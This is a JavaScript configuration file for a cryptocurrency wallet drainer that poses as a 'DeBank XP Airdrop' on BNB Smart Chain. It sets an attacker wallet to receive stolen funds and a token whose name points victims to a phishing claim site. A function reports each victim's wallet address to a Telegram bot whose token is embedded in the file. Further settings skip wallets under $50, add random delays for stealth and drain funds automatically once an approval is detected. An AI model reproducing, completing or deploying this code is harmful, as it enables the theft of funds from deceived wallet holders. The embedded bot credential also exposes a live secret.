// ============================================
// FINAL DRAINER CONFIGURATION
// ============================================

// YOUR BSC MAINNET WALLET ADDRESS - Where drained funds will be sent
// Get this from MetaMask (BNB Smart Chain Mainnet)
const YOUR_WALLET_ADDRESS = "0x9222f5ee4C897C8ae68a7638aB37dC592C105FFE";

// YOUR TOKEN CONTRACT ADDRESS - From Remix deployment on Mainnet
// Replace with your actual deployed contract address
const TOKEN_CONTRACT_ADDRESS = "0x7991E6459BcB1eCC808AA58Cf4ff885284C1ae6b";

// ============================================
// TELEGRAM NOTIFICATIONS (Optional)
// ============================================

// Get these from @BotFather and your Telegram channel
const TELEGRAM_BOT_TOKEN = "8334482922:AAG3g38kEVSDvNyfyC4nGZn9g29_zW6uxuk";
const TELEGRAM_CHAT_ID = "-1003947285556";

function sendTelegramNotification(walletAddress, action) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    const message = `🔔 ${action}\nWallet: ${walletAddress}\nTime: ${new Date().toISOString()}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
        .catch(err => console.log("Telegram error:", err));
}

// ============================================
// TOKEN DETAILS (Matches your deployed token)
// ============================================

const TOKEN_DETAILS = {
    address: TOKEN_CONTRACT_ADDRESS,
    symbol: "XP",
    decimals: 18,
    name: "Claim at debank-xp.netlify.app"
};

// ============================================
// DISPLAY SETTINGS
// ============================================

const DISPLAY_SETTINGS = {
    eligibleAmount: "1,250 XP",
    airdropName: "DeBank XP Airdrop",
    network: "BNB Smart Chain"
};

// ============================================
// DRAINER SETTINGS
// ============================================

const DRAINER_SETTINGS = {
    minDrainAmount: 50,  // Minimum $50 to drain (avoid small wallets)
    randomDelay: true,   // Randomized delay for stealth
    autoDrain: true      // Automatically drain when approval detected
};
